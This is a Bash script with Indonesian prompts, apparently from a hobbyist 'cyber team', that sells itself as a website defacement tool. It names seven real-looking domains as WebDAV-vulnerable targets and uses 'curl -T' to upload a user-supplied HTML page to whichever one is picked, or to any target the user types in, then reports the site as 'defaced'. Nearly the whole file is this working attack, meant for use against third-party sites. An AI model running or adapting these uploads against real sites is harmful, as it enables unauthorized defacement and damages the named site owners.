#Jangan Di Decode Ya Gan Tuhan Maha Melihat
#Karena Script Ini Hanya Testing/blm sempurna

































































































clear
blue='\e[1;34m'
green='\e[1;32m'
purple='\e[1;35m'
cyan='\e[1;36m'
red='\e[1;31m'
white='\e[1;37m'
yellow='\e[1;33m'
pa='http://uzingela.co.za'
us='http://thefoundation.co.za'
i='http://techdirect.co.za'
ch='http://tieronecapital.co.za'
an='http://totemafrica.com'
e='http://ziady.com'
l='http://whadiz.com'
clear
echo -e $green'[+]==========================================[+]'
echo -e $red'[~]=========== Welcome To Tools ©AmmarBN ==========[~]'
echo -e $purple'[~]===== Code by ©AmmarBN | github.com/AmmarBN =====[~]'
echo -e $purple'[~]========= Team : Python Cyber Team  =========[~]'
echo -e $green'[+]==========================================[+]'
echo -e $yellow'[!]======= Input This List Menu =========[!]'
sleep 2
echo
echo -e $white'╔════════════════════════════════════════════════╗'
python log.py
echo -e $white'╚════════════════════════════════════════════════╝'
echo
echo -e $green'  [!]'$cyan' Web Fuln Webdav '$green'[!]'
sleep 0.1;
echo -e $blue'{1} http://uzingela.co.za'
sleep 0.1;
echo -e $blue'{2} http://thefoundation.co.za'$green'(Belum Update)'
sleep 0.1;
echo -e $blue'{3} http://techdirect.co.za'$green'(Belum Update)'
sleep 0.1;
echo -e $blue'{4} http://tieronecapital.co.za'$green'(Belum Update)'
sleep 0.1;
echo -e $blue'{5} http://totemafrica.com'$green'(Belum Update)'
sleep 0.1;
echo -e $blue'{6} http://ziady.com'$green'(Belum Update)'
sleep 0.1;
echo -e $blue'{7} http://whadiz.com'$green'(Belum Update)'
sleep 0.1;
echo -e $blue'{8} Punya Target Sendiri'
sleep 0.1;
echo -e $blue'[9] Info Tools'
sleep 0.1;
echo -e $cyan'[10] Buat Script Deface'
sleep 0.1
echo -e $cyan'[11] Report Script Eror'
sleep 0.1
echo -e $purple'[0] exit'
echo -e $yellow''
read -p"PILIH Yang Mana ?: " Next;
if [ $Next = 1 ] || [ $Next = satu ]
then
echo
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard'
echo -e $red'Masukan Lokasi Script'
echo -e $red'contoh : index.html'
read -p " ==>> " sc;
curl -T /sdcard/$sc $pa
echo -e $yellow''
bash load.sh
echo
echo -e $cyan' [!] Berhasil Terdeface => ' $pa/$sc
exit
elif [ $Next = 2 ] || [ $Next = dua ]
then
echo
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard'
echo -e $red'Masukan Lokasi Script'
echo -e $red'contoh : index.html'
read -p " ==>> " sc;
curl -T /sdcard/$us $pa
echo -e $yellow''
cd data
bash load.sh
echo
echo -e $cyan' [!] Berhasil Terdeface => ' $us/$sc
exit
elif [ $Next = 3 ] || [ $Next = tiga ]
then
echo
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard'
echo -e $red'Masukan Lokasi Script'
echo -e $red'contoh : index.html'
read -p " ==>> " sc;
curl -T /sdcard/$sc $i
echo -e $yellow''
cd data
bash load.sh
echo
echo -e $cyan' [!] Berhasil Terdeface => ' $i/$sc
exit
elif [ $Next = 4 ] || [ $Next = empat ]
then
echo
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard'
echo -e $red'Masukan Lokasi Script'
echo -e $red'contoh : index.html'
read -p " ==>> " sc;
curl -T /sdcard/$sc $ch
echo -e $yellow
cd data
bash load.sh
echo
echo -e $cyan' [!] Berhasil Terdeface => ' $ch/$sc
exit
elif [ $Next = 5 ] || [ $Next = lima ]
then
echo
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard'
echo -e $red'Masukan Lokasi Script'
echo -e $red'contoh : index.html'
read -p " ==>> " sc;
curl -T /sdcard/$sc $an
echo -e $yellow''
cd data
bash load.sh
echo
echo -e $cyan' [!] Berhasil Terdeface => ' $an/$sc
exit
elif [ $Next = 6 ] || [ $Next = enam ]
then
echo
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard'
echo -e $red'Masukan Lokasi Script'
echo -e $red'contoh : index.html'
read -p " ==>> " sc;
curl -T /sdcard/$sc $e
echo -e $yellow''
cd data
bash load.sh
echo
echo -e $cyan' [!] [!] Berhasil Terdeface => ' $e/$sc
exit
elif [ $Next = 7 ] || [ $Next = tujuh ]
then
echo
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard'
echo -e $red'Masukan Lokasi Script'
echo -e $red'contoh : index.html'
read -p " ==>> " sc;
curl -T /sdcard/$sc $l
echo -e $yellow''
cd data
bash load.sh
echo
echo -e $cyan' [!] [!] Berhasil Terdeface => ' $l/$sc
exit
elif [ $Next = 8 ] || [ $Next = delapan ]
then
echo -e $yellow'<<<<<<<<<<<<<<>>>>>>>>>>>>>>'
echo -e $green'   [!] Pastikan Web Vuln'
echo -e $yellow'<<<<<<<<<<<<<<>>>>>>>>>>>>>>'
read -p " Masukan Web Target >> " Target;
sleep 0.3;
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard'
echo -e $red'Masukan Lokasi Script'
echo -e $red'contoh : index.html'
read -p " Masukan Lokasi Script >> " sc;
curl -T /sdcard/$sc $Target
echo -e $yellow''
cd data
bash load.sh
echo
echo -e $cyan' [!] Berhasil Terdeface => ' $Target/$sc
exit
elif [ $Next = 9 ] || [ $Next = sembilan ]
then
sleep 1;
echo
echo -e $cyan"ini Adalah Tools Untuk Deface Website "
echo 'Coded by ©AmmarBN'
echo 'Python Cyber Team'
echo
python log2.py
exit
elif [ $Next = 10 ] || [ $Next = sepuluh ]
then
cd data
python2 ScripCreate.py
exit
elif [ $Next = 11 ] || [ $Next = sepuluh ]
then
cd data
python report.py
exit
elif [ $Next = 0 ] || [ $Next = kosong ]
then
exit
else
echo -e $red'!!!!!'
sleep 0.1;
echo -e $cyan'Wrong Input!!!'
sleep 0.1;
echo -e $cyan'Masukan Pilihan Dengan Benar!!!'
sleep 1;
bash deface.sh
fi
